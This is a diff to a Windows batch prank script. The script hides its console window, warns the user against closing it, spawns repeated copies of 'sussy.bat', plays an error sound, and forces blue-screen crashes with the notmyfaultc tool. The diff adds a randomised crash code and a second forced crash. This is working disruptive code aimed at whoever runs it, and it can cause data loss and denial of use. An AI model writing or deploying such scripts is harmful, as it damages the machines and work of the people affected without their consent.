@@ -41,7 +41,12 @@ IF %errorlevel%==2 goto exit
 echo Don't even think about closing this window...
 goto hide
 :bsod
-notmyfaultc crash 1
+set /A rnd3=%RANDOM% * 8 / 32768 + 1
+echo %rnd3%
+cmdow @ /vis
+pause
+notmyfaultc crash %rnd3%
+notmyfaultc crash 8
 :hide
 CMDOW @ /HID
 goto music
@@ -59,6 +64,7 @@ start "sussy shell :)" cmd /c "%CD%\sussy.bat"
 start "sussy shell :)" cmd /c "%CD%\sussy.bat"
 start "sussy shell :)" cmd /c "%CD%\sussy.bat"
 timeout /t 60
+powershell -command "(New-Object Media.SoundPlayer "%CD%\WinError.wav").PlaySync();
 goto bsod
 pause
 :exit
